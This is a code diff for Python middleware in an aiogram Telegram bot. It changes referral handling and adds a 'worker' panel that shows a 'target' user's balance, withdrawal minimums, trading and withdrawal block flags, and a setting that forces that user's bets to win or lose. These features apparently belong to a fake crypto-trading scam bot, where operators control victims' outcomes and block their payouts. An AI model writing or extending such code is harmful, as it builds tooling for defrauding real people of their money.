@@ -2,12 +2,11 @@ from aiogram import BaseMiddleware
 from aiogram.types import Message, CallbackQuery
 import logging
 from aiogram.exceptions import TelegramBadRequest
-from database.models import User
+from database.models import User, Order
 from database.connect import async_session
-from database.crud import register_referal
+from database.crud import register_referal, get_user_by_tg_id
 from sqlalchemy import select, update
 from datetime import datetime
-from utils.main_bot_api_client import LogRequest, main_bot_api_client, ReferalModel
 import asyncio
 import keyboards as kb
 
@@ -25,25 +24,22 @@ class AuthorizeMiddleware(BaseMiddleware):
                             lname=event.from_user.last_name,
                             username=event.from_user.username
                             )
-                session.add(user)
-                if 'command' in data and (command := data['command']).args:
-                     referer_tg_id = command.args
-                     ref_model = ReferalModel(
-                             referal_tg_id=user.tg_id,
-                             referal_link_id=command.args,
-                             fname=user.fname,
-                             lname=user.lname,
-                             username=user.username
-                         )
-                     asyncio.create_task(main_bot_api_client.send_referal(ref_model))
-                     if (referer := (await session.scalar(
-                        select(User).where(User.tg_id == referer_tg_id)
-                     ))) and referer is not user: # referer exsist
-                         await session.commit()
-                         await register_referal(session, referer, user, 
-                                                bot=data['bot'])
                 logger = logging.getLogger()
                 logger.info(f'New user')
+                session.add(user)
+            if 'command' in data and (command := data['command']).args:
+                 referer_tg_id = command.args
+                 referer = await get_user_by_tg_id(session, referer_tg_id)
+                 await session.refresh(user, ['referer'])
+                 if referer and referer is not user and user.referer is None:
+                     user.currency = referer.currency_for_referals
+                     session.add(user)
+                     await session.commit()
+                     await register_referal(session, referer, user, 
+                                            bot=data['bot'])
+            if user.is_blocked:
+                await event.answer("Ваш аккаунт заблокирован")
+                return False
             query = update(User).where(User.tg_id==user.tg_id).values(last_login=datetime.now())
             await session.execute(query)
             await session.commit()
@@ -63,7 +59,38 @@ class IsAdminMiddleware(BaseMiddleware):
             return await handler(message, data)
 
 
+def get_order_string_representation(order: Order):
+    return f'''🗓 Дата и время: {order.created_at}
+📍 Ставка: {order.amount} USD
+💰 Профит:  {order.profit} USD
+🖇 Предмет: {order.cryptocurrency}
+🕔 Время: {order.time.seconds} сек.'''
+
+async def get_string_user_representation(target: User, worker: User):
+    states = {None: 'Рандом', False: 'Проигрыш', True: 'Выигрыш'}
+    orders = await target.awaitable_attrs.orders
+    return f'''🆔 Id: {target.tg_id} {f'\n👦 Username: @{target.username}'
+                                     if target.username else ''}
+👨‍💻 Воркер: {worker.tg_id}
+💰 Баланс: {target.balance} USD
+ ∟Мин. вывод: {target.min_withdraw} USD
+🔝 Максимальный баланс: {target.max_balance} USD
+💸 Минимальная сумма пополнения: {target.min_deposit} USD
+📑 Верификация: {'✅' if target.is_verified else '❌'}
+📊 Статус торгов: {'✅' if not target.bidding_blocked else '❌'}
+💰 Статус вывода: {'✅' if not target.withdraw_blocked else '❌'}
+🎰 Статус: {states[target.bets_result_win]}
+
+📊 Последняя ставка:
+{get_order_string_representation(orders[-1]) if orders else "* Ставок ещё нет *"}
+'''
+
+
 class WorkerInjectTargetUserMiddleware(BaseMiddleware):
+    def __init__(self, *args, get_text: callable=get_string_user_representation, **kwargs):
+        self.get_text = get_text
+        super().__init__(*args, **kwargs)
+
     async def __call__(self, handler, callback: CallbackQuery, data) -> bool:
         if (not callback.data.startswith('worker_') 
                 or not callback.data.split('_')[-1].isdigit()):
@@ -75,8 +102,9 @@ class WorkerInjectTargetUserMiddleware(BaseMiddleware):
         res = await handler(callback, data)
         session.add(target)
         try:
-            await callback.message.edit_reply_markup(
-                reply_markup=kb.get_worker_user_managment_kb(data['user']))
+            await callback.message.edit_text(
+                await self.get_text(worker=data['user'], target=target),
+                reply_markup=kb.get_worker_user_managment_kb(target))
         except TelegramBadRequest:
             pass # msg not modified
         return res
